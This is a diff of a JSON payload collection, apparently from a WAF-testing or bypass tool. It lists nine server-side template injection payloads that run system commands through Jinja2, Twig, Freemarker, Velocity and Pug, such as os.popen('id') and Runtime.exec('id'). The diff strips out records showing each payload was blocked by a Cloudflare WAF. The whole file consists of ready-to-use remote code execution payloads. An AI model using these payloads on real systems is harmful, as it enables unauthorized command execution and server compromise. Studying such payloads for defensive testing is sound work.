@@ -10,12 +10,7 @@
       "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
       "description": "Jinja2 OS command",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1002",
@@ -24,12 +19,7 @@
       "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
       "description": "Jinja2 subprocess",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1003",
@@ -38,12 +28,7 @@
       "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
       "description": "Jinja2 import",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1004",
@@ -52,12 +37,7 @@
       "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
       "description": "Twig filter callback",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1005",
@@ -66,12 +46,7 @@
       "payload": "{{['id']|filter('system')}}",
       "description": "Twig system filter",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1006",
@@ -80,12 +55,7 @@
       "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
       "description": "Freemarker Execute",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1007",
@@ -94,12 +64,7 @@
       "payload": "<#assign classloader=object?api.class.protectionDomain.classLoader>",
       "description": "Freemarker classloader",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1008",
@@ -108,12 +73,7 @@
       "payload": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))",
       "description": "Velocity Runtime",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "ssti-1009",
@@ -122,12 +82,7 @@
       "payload": "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('id')}()}",
       "description": "Pug/Jade RCE",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
